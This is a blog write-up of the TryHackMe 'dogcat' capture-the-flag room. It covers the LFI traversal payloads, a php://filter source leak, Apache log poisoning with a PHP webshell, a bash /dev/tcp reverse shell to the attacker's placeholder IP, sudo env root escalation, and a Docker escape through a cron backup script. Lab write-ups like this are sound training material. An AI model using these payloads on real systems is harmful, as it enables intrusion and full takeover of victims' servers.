@@ -1,0 +1,379 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[THM] dogcat writeup</title>
+<meta name="author" content="Lamprinos Chatziioannou" />
+<meta name="generator" content="Org Mode" />
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap"rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"rel="stylesheet"><link rel="stylesheet" href="/src/rougier.css" />
+    <link rel="icon" type="image/x-icon" href="/src/favicon.ico"><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+<div id="org-div-home-and-up">
+ <a accesskey="h" href="./index.html"> UP </a>
+ |
+ <a accesskey="H" href="/index.html"> HOME </a>
+</div><div id="content" class="content">
+<h1 class="title">[THM] dogcat writeup</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org19ddb68">Reconnaissance</a>
+<ul>
+<li><a href="#org5124561">Further enumeration</a>
+<ul>
+<li><a href="#org2536313">Viewing the source code</a></li>
+<li><a href="#org00ea295">Gobuster</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#orgd6b3eb2">Exploitation</a>
+<ul>
+<li><a href="#org56d27be">The passwd file</a></li>
+<li><a href="#org1cbf3d9">Checking the logs</a></li>
+<li><a href="#org5de4b6d">Webshell</a></li>
+<li><a href="#org18b5eda">Remote shell &gt;&gt; Webshell</a></li>
+</ul>
+</li>
+<li><a href="#org2515d8a">Privilege escalation</a></li>
+<li><a href="#org5e6d24a">Where do we go from here</a></li>
+<li><a href="#orgad54686">Summary</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org19ddb68" class="outline-2">
+<h2 id="org19ddb68"><a href="#org19ddb68">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-org19ddb68">
+<p>
+First I decided to use <code>masscan</code> on all of the machine ports to limit the ports
+I would then run more elaborate scans. However, since that scan did not wield
+any results, I went back to good old <code>nmap</code>.
+</p>
+<div class="code" id="org4a5a513">
+<p>
+sudo nmap -Pn &lt;MACHINE<sub>IP</sub>&gt;
+</p>
+
+</div>
+<p>
+This checks only the most frequently used ports but gave us a good place to
+start; two ports were open:
+</p>
+<ul class="org-ul">
+<li>22 which belongs to <code>ssh</code></li>
+<li>80 which signals the existence of a webserver</li>
+</ul>
+<p>
+After that I ran
+</p>
+<div class="code" id="org49aaa29">
+<p>
+sudo nmap -A -p22,80 &lt;MACHINE<sub>IP</sub>&gt;
+</p>
+
+</div>
+<p>
+to get more information on the software these ports were running.
+</p>
+<blockquote>
+<p>
+22: OpenSSH 7.6p1, running on a Ubuntu Machine
+80: Apache 2.4.38 WebServer
+</p>
+</blockquote>
+</div>
+
+<div id="outline-container-org5124561" class="outline-3">
+<h3 id="org5124561"><a href="#org5124561">Further enumeration</a></h3>
+<div class="outline-text-3" id="text-org5124561">
+</div>
+<div id="outline-container-org2536313" class="outline-4">
+<h4 id="org2536313"><a href="#org2536313">Viewing the source code</a></h4>
+<div class="outline-text-4" id="text-org2536313">
+<p>
+Just by checking the source code for the website through the <i>Inspect tool</i> in
+Firefox, it is easy for us to see that there are two directories called dogs and
+cats, each of which holds pictures in the form of <i>&lt;NO&gt;.jpg</i> where NO ranges
+from 1 to 10.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org00ea295" class="outline-4">
+<h4 id="org00ea295"><a href="#org00ea295">Gobuster</a></h4>
+<div class="outline-text-4" id="text-org00ea295">
+<p>
+Even though it is a generally good habit to use <code>gobuster</code> to check for any
+useful accessible files, it was not the case in this room. In fact, I think that
+it was due to this type of scanning that I had to terminate the vm and restart
+it in order for it to respond to my <i>GET</i> requests.
+</p>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-orgd6b3eb2" class="outline-2">
+<h2 id="orgd6b3eb2"><a href="#orgd6b3eb2">Exploitation</a></h2>
+<div class="outline-text-2" id="text-orgd6b3eb2">
+<p>
+We see that the website uses <code>?view=dog</code> to display a random picture for a dog
+or a cat respectively, pointing out that we could check for <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion">Local File
+Inclusion</a>.
+</p>
+
+<p>
+After a little bit of toying around with that, realising that the string passed
+needs to contain either <i>dog</i> or <i>cat</i> in order to be executed by the php
+back-end, we try to see what files we can access:
+</p>
+<div class="code" id="org94044f8">
+<p>
+?view=../../../../../etc/passwd%00dog
+</p>
+
+<p>
+?view=dog/../../../../../etc/passwd
+</p>
+
+<p>
+?view=dogs
+</p>
+
+</div>
+<p>
+The first one showed an error about the file, while the second one proved to be
+<span class="underline">very</span> interesting. The server side did not search for the /etc/passwd file but
+for /etc/passwd.php. The backend adds an extension to what we pass!
+</p>
+
+<p>
+That means, that instead of dog or cat the backend reads a dog.php or cat.php
+respectively. It may be beneficial to access it:
+</p>
+
+<p>
+Using a php wrapper we tailor the request to our needs:
+</p>
+<blockquote>
+<p>
+?view=php://filter/convert.base64-encode/dog
+</p>
+</blockquote>
+<p>
+Getting back the code for <i>dog.php</i> encoded in base64.
+To decode it, avoiding online tools one can simply use
+</p>
+
+<div class="code" id="org2003f5c">
+<p>
+echo &rsquo;&lt;paste encoded code here&gt;&rsquo; &gt; dog.b64
+base64 -d dog.b64 &gt; dog.php
+</p>
+
+</div>
+
+<p>
+We do the same for <i>cat.php</i> but it turns out that these files have no actual
+meaning. They do not reveal any useful information. This changes when we get the
+<i>index.php</i>. Inside it we realise that the <code>.php</code> extension that gets added to
+our requests can be changed using the <code>?ext=</code> parameter!
+</p>
+</div>
+
+<div id="outline-container-org56d27be" class="outline-3">
+<h3 id="org56d27be"><a href="#org56d27be">The passwd file</a></h3>
+<div class="outline-text-3" id="text-org56d27be">
+<p>
+Going back to previous requests we can finally see /etc/passwd!!
+</p>
+<div class="code" id="org1b70a81">
+<p>
+?view=dog/../../../../../etc/passwd&amp;ext=
+</p>
+
+</div>
+<p>
+Completely minimal installation; Only one user has terminal access, <code>root</code> and
+every other account listed on passwd has <code>nologin</code> set as shell.
+</p>
+
+<p>
+Bruteforcing root over ssh does not wield any results :(
+</p>
+</div>
+</div>
+
+<div id="outline-container-org1cbf3d9" class="outline-3">
+<h3 id="org1cbf3d9"><a href="#org1cbf3d9">Checking the logs</a></h3>
+<div class="outline-text-3" id="text-org1cbf3d9">
+<p>
+After just a little bit of googling, we can see that the apache server holds
+logs of all the requests at <code>/var/log/apache2/access.log</code>, and it also logs the
+user agent we have used for the request.
+</p>
+
+<p>
+We can see now how to proceed, manually set the agent to a webshell and run all
+the commands through it. Will it work?
+</p>
+
+<p>
+Yup, it worked.
+</p>
+</div>
+</div>
+
+<div id="outline-container-org5de4b6d" class="outline-3">
+<h3 id="org5de4b6d"><a href="#org5de4b6d">Webshell</a></h3>
+<div class="outline-text-3" id="text-org5de4b6d">
+<p>
+Either through <code>curl</code>, <code>burpsuite</code> or <code>zap</code> we set the user-agent to
+</p>
+<div class="code" id="org2846d6a">
+<p>
+&lt;?php system($<sub>GET</sub>[&rsquo;cmd&rsquo;]) ?&gt;
+</p>
+
+</div>
+<p>
+and modify our link so that it also has a cmd parameter, which I set to <code>ls</code> to
+verify that it is working
+</p>
+</div>
+</div>
+
+<div id="outline-container-org18b5eda" class="outline-3">
+<h3 id="org18b5eda"><a href="#org18b5eda">Remote shell &gt;&gt; Webshell</a></h3>
+<div class="outline-text-3" id="text-org18b5eda">
+<p>
+To get from the webshell to a remote shell is nothing difficult; We open a
+listener in our machine <code>nc -lvnp &lt;port&gt;</code> and then use a <i>good enough</i> command
+on the cmd parameter
+</p>
+
+<p>
+I went with this one ( after checking with <code>whereis bash</code> )
+</p>
+<div class="code" id="org2d21593">
+<p>
+bash -c &ldquo;bash -i &gt;&amp; /dev/tcp/&lt;MYIP&gt;/&lt;MYPORT&gt; 0&gt;&amp;1&rdquo;
+</p>
+
+</div>
+
+<p>
+<i>Hint</i>: Do not forget to encode it as url<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
+</p>
+</div>
+</div>
+</div>
+
+<div id="outline-container-org2515d8a" class="outline-2">
+<h2 id="org2515d8a"><a href="#org2515d8a">Privilege escalation</a></h2>
+<div class="outline-text-2" id="text-org2515d8a">
+<p>
+Now the difficult part is over; two of the flags are within our reach without
+even trying to gain root privileges&#x2026; but what if&#x2026;!
+</p>
+
+<p>
+Naturally the first step was to check for sudo privileges <code>sudo -l</code>
+It lets us run <code>env</code> without a password, which means, pretty much that we can do
+anything we want as root on the machine.
+</p>
+<div class="code" id="org8e701b7">
+<p>
+sudo env bash
+</p>
+
+</div>
+
+<p>
+The third flag is in the <code>/root</code> directory
+</p>
+</div>
+</div>
+
+<div id="outline-container-org5e6d24a" class="outline-2">
+<h2 id="org5e6d24a"><a href="#org5e6d24a">Where do we go from here</a></h2>
+<div class="outline-text-2" id="text-org5e6d24a">
+<p>
+I started digging around the system, hoping I could find something useful to see
+where to go from there. I ran <code>ls -al</code> on <code>/</code> and discovered a <code>.dockerenv</code>. It
+seems we&rsquo;re inside a Docker environment!
+</p>
+
+<p>
+(Well obviously, it is in the room description&#x2026; Except if you forgot to read
+it thoroughly)
+</p>
+
+<p>
+Next stop was to check whether <code>crontab -l</code> had something to show&#x2026; No luck there
+</p>
+
+<p>
+Not long after I realised that the <code>/opt</code> directory was nearly empty ( In
+hindsight I think it may have had been wise to check for <code>du</code> at that point ),
+and inside it was an interesting <code>backup.sh</code> file.
+</p>
+
+<p>
+I added a reverse shell there, opened a listener on my machine, just in case it
+was scheduled to run every now and then and kept digging. Lucky me<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup> after a
+little time I saw that my netcat listener was now a root shell outside of the
+docker environment!!
+</p>
+
+<p>
+Getting the flag from there was extremely easy.
+</p>
+</div>
+</div>
+<div id="outline-container-orgad54686" class="outline-2">
+<h2 id="orgad54686"><a href="#orgad54686">Summary</a></h2>
+<div class="outline-text-2" id="text-orgad54686">
+<p>
+Even though I had met and toyed around with LFI before, it was the first time I
+had to use it in a CTF room and proved to be quite interesting to me, relying on
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a> to get some information on techniques and places to start
+</p>
+
+<p>
+Also, it was interesting to see the docker aspect of the room, which I could not
+understand even hours after completing the room ( it seemed way too simple )
+</p>
+</div>
+</div>
+<div id="footnotes">
+<h2 class="footnotes">Footnotes: </h2>
+<div id="text-footnotes">
+
+<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+Obviously one can always perform this step using many other techniques.
+This one just feels more natural to me.
+</p></div></div>
+
+<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
+After finishing this article, I decided to check the writeups suggested
+in thm, to see if anyone had a better explanation one more logical than my
+<i>hunch</i>. It was impressively simple: The backup directory that existed in
+<code>/opt/backups</code> was significantly <i>newer</i> than the shell script, meaning that the
+machine was backed up regularly
+</p></div></div>
+
+
+</div>
+</div></div>
+<div id="postamble" class="status">
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id="R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="date footer"> Originally created on 2022-03-26 Sat 00:00 </p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+</div>
+</body>
+</html>
